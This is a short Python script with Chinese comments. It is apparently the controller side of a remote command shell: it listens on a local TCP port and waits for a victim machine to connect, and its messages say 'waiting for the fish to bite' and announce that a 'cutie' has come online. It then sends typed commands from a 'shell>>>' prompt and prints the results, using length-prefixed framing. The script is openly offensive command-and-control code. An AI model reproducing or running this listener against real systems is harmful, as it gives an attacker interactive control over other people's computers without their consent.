import socket
import struct
#指挥者 控制端 下达执行
def recv_data(sock, buf_size=1024):
    """解决粘包"""
    # 先接受长度
    x = sock.recv(4)
    all_size = struct.unpack('i', x)[0]
    # 接收真实数据
    recv_size = 0
    data = b''
    while recv_size < all_size:
        data += sock.recv(buf_size)
        recv_size += buf_size
    return data


def send_data(sock, data):
    """发送数据也解决粘包问题"""
    if type(data) == str:
        data = data.encode("utf-8")
    # 计算数据长度 , 打包发送
    cmd_len = struct.pack('i', len(data))
    sock.send(cmd_len)
    # 发送数据
    sock.send(data)


#1、实例化一个socket对象
#AF_INET 表示基于网络通信 SOCK_STREAM 表示 TCP
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#2、绑定一个IP和端口（>1024）
sock.bind(("127.0.0.1",7777))
#3、开启监听
sock.listen(5)
#4、等待被连接
print("[+] 服务端准备就绪,等待鱼儿上钩...")
fd, addr = sock.accept()
print(f"[+] d=====(￣▽￣*)b，有小可爱上线请注意。。{addr}")
while True:
    cmd = input("shell>>>").strip()
    if cmd == "q":
        send_data(fd, cmd)

        break # 自己再断开
    send_data(fd,cmd)
    #5、接收数据
    res = recv_data(fd).decode("utf-8")
    print(f"执行结果：{res}")
#7、关闭连接
fd.close()
sock.close()